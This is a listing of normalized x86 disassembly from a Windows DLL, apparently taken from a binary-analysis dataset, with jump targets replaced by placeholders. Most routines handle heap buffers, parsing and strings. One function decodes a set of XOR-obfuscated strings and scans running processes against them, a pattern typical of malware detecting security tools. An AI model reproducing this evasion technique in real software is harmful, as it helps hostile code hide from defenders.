mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xdc ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
sub_100248f0
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
xor esi esi
xor ebx ebx
xor ecx ecx
mov [ ebp + 0x14 ] esi
test edi edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
sub eax ecx
cmp eax 0x2
jb r-xdata
mov al [ ecx + edx ]
cmp al 0xa
je r-xdata
cmp [ ecx + edx ] 0xd
jne r-xdata
inc ecx
cmp ecx edi
jb r-xdata
cmp al 0x3d
jne r-xdata
cmp [ ecx + edx + 0x1 ] 0xa
je r-xdata
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x14 ] esi
test ebx ebx
je r-xdata
cmp al 0x7f
ja r-xdata
inc esi
cmp esi 0x2
ja r-xdata
lea eax [ ebx + ebx * 2 ]
mov ebx [ ebp + 0xc ]
lea eax [ eax + eax + 0x7 ]
shr eax 0x3
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
mov [ ebp + 0x14 ] esi
pop esi
mov [ ebp - 0x4 ] ecx
mov eax 0xffffffd4
pop ebx
mov esp ebp
pop ebp
retn
movzx eax al
mov al [ eax + r--data ]
cmp al 0x7f
je r-xdata
pop edi
mov [ ebp + 0x14 ] esi
pop esi
mov [ ebp - 0x4 ] ecx
mov eax 0xffffffd4
pop ebx
mov esp ebp
pop ebp
retn
pop edi
mov [ ebx ] eax
pop esi
mov eax 0xffffffd6
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] eax
jb r-xdata
cmp al 0x40
jae r-xdata
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x4 ]
push edx
lea eax [ ebp + 0x10 ]
push eax
lea edi [ ebp - 0x10 ]
lea ecx [ ebp + 0x14 ]
lea esi [ ebp - 0x8 ]
lea eax [ ebp + 0x8 ]
call sub_1005f560
mov ecx [ ebp - 0xc ]
add esp 0xc
sub ecx [ ebp + 0x8 ]
mov [ ebx ] ecx
inc ebx
test esi esi
jne r-xdata
sub_100249e1
push 0x6c
mov eax sub_1007f427
call sub_1001bb6b
mov eax [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005434f
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x6c ] ebx
call sub_10069ce0
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10051f6c
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x51 ] 0x0
call sub_1003b7cf
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
mov edi [ ebp - 0x58 ]
and [ ebp - 0x60 ] 0x0
and [ ebp - 0x64 ] 0x0
mov [ eax ] 0x7830
add eax 0x2
push edi
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] 0x0
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
push edi
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_10066573
push edi
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
inc edi
mov ecx esi
mov [ ebp - 0x50 ] edi
call sub_10066573
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] al
jne r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_10004056
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_10022901
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_10004056
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov [ ebp - 0x59 ] al
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
mov ecx esi
call sub_10066573
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
xor ebx ebx
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
push 0x41
push 0x61
mov [ ebp - 0x78 ] al
push 0x30
push [ ebp - 0x78 ]
push [ ebp + 0x8 ]
call sub_10022901
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
push [ ebp - 0x58 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_10066573
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x64 ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
dec [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_10022901
add esp 0x14
test eax eax
js r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x59 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
jge r-xdata
mov edi [ ebp - 0x74 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
mov al [ eax + r--data ]
mov [ edi ] al
inc edi
inc [ ebp - 0x60 ]
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x64 ]
mov [ edi ] 0x0
push 0x0
mov [ eax ] ecx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
xor eax eax
call sub_1004fa89
retn
cmp [ esi + 0x5 ] 0x70
je r-xdata
mov ecx esi
call sub_10004056
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x59 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
call sub_10066573
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov [ edi ] 0x70
mov ecx esi
inc edi
call sub_10066573
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x50
jne r-xdata
mov ecx esi
call sub_10004056
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] bl
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
push [ ebp - 0x58 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
inc edi
call sub_10066573
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10066573
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
inc edi
inc ebx
mov ecx esi
call sub_10004056
sub_10024fb0
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x8 ] 0x0
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebp - 0x10 ] eax
call sub_100796a0
mov eax [ ebp + 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
add eax 0x54
call sub_10007a30
mov eax [ ebp - 0x10 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call esi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
sub_10025020
push ebp
mov ebp esp
sub esp 0x4d4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2f
and edx 0xff
mov [ ebp + eax * 2 - 0x1a8 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x190 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x71
and edx 0xff
mov [ ebp + eax * 2 - 0x220 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x204 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x24c ] dx
inc eax
cmp eax 0x14
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x224 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x6c
and edx 0xff
mov [ ebp + eax * 2 - 0x144 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12e ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x41
and edx 0xff
mov [ ebp + eax * 2 - 0x18c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x176 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc4
and edx 0xff
mov [ ebp + eax * 2 - 0x114 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xfe ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x49
and edx 0xff
mov [ ebp + eax * 2 - 0x9c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffa3
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x53
and edx 0xff
mov [ ebp + eax * 2 - 0x1e0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c6 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffc6
and edx 0xff
mov [ ebp + eax * 2 - 0x174 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x15e ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffb7
and edx 0xff
mov [ ebp + eax * 2 - 0xcc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0xfc ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xe6 ] ax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x2a
and edx 0xff
mov [ ebp + eax * 2 - 0x12c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x116 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffab
and edx 0xff
mov [ ebp + eax * 2 - 0x200 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcd
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1c ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x1c4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1ac ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe1
and edx 0xff
mov [ ebp + eax * 2 - 0x15c ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x146 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x42 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x54
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff9e
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x70 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa1
and edx 0xff
mov [ ebp + eax * 2 - 0xe4 ] dx
inc eax
cmp eax 0xb
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xce ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffae
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x30 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff94
and edx 0xff
mov [ ebp + eax * 2 - 0xb4 ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
mov [ ebp - 0xa0 ] ax
lea ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x4d4 ] ecx
lea edx [ ebp - 0x220 ]
mov [ ebp - 0x4d0 ] edx
lea eax [ ebp - 0x24c ]
mov [ ebp - 0x4cc ] eax
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x4c8 ] ecx
lea edx [ ebp - 0x18c ]
mov [ ebp - 0x4c4 ] edx
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x4c0 ] eax
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4bc ] ecx
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x4b8 ] edx
lea eax [ ebp - 0x1e0 ]
mov [ ebp - 0x4b4 ] eax
lea ecx [ ebp - 0x174 ]
mov [ ebp - 0x4b0 ] ecx
lea edx [ ebp - 0xcc ]
mov [ ebp - 0x4ac ] edx
lea eax [ ebp - 0xfc ]
mov [ ebp - 0x4a8 ] eax
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4a4 ] ecx
lea edx [ ebp - 0x200 ]
mov [ ebp - 0x4a0 ] edx
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x1c4 ]
lea edx [ ebp - 0x15c ]
mov [ ebp - 0x49c ] eax
mov [ ebp - 0x498 ] ecx
mov [ ebp - 0x494 ] edx
push edi
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x490 ] eax
mov [ ebp - 0x48c ] ecx
mov [ ebp - 0x488 ] edx
push 0x0
lea eax [ ebp - 0xe4 ]
lea ecx [ ebp - 0x40 ]
lea edx [ ebp - 0xb4 ]
push 0x2
mov [ ebp - 0x484 ] eax
mov [ ebp - 0x480 ] ecx
mov [ ebp - 0x47c ] edx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0x478 ]
push eax
push edi
mov [ ebp - 0x478 ] 0x22c
call [ Process32FirstW@IAT ]
mov ebx [ CharUpperW@IAT ]
push esi
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x1
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
inc esi
cmp esi 0x17
jb r-xdata
mov edx [ ebp + esi * 4 - 0x4d4 ]
push edx
lea eax [ ebp - 0x454 ]
push eax
call sub_1005dcbd
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x478 ]
push ecx
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x454 ]
push ecx
call ebx
xor esi esi
lea esp [ esp ]
push edi
call [ CloseHandle@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10025650
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
dec eax
mov [ ecx + 0x4 ] eax
mov ecx [ ecx ]
mov eax [ ecx + eax * 4 ]
pop ebp
retn
pop ebp
retn
sub_1002566a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004cd80
add esp 0x18
pop ebp
retn
sub_10025690
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0x10 ]
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0xa ]
push ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push esi
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call edx
test eax eax
jne r-xdata
cmp eax 0x3
mov eax [ ebp - 0x4 ]
jne r-xdata
lea eax [ ebp + 0xa ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
pop edi
sub eax esi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
inc [ ebp - 0x4 ]
cmp esi ebx
je r-xdata
sub_10025720
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test edx edx
je r-xdata
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
cmp ecx 0x8
jb r-xdata
cmp edx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d170
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea eax [ eax + edi * 2 ]
cmp eax edx
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
pop ebx
xor edx edx
mov [ eax ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
push ecx
sub edx eax
sar edx 0x1
push edx
push esi
mov ecx esi
call sub_10043930
pop edi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
pop ebx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
lea ecx [ ebx + ebx ]
push ecx
push edx
mov edx [ esi + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10025840
push ebp
mov ebp esp
push 0xffffffff
push sub_10083627
mov eax [ fs : 0x0 ]
push eax
sub esp 0x23c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor ebx ebx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push eax
call sub_1004d9c0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x218 ]
push ebx
push ecx
call sub_10079a10
add esp 0xc
lea ecx [ ebp - 0x218 ]
call sub_10048a90
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x238 ]
cmp esi ebx
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x23c ] ebx
mov [ ebp - 0x238 ] ebx
call sub_1003b340
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x23c ] ebx
jne r-xdata
push 0x1
call sub_10055606
add esp 0x4
push eax
lea ecx [ ebp - 0x244 ]
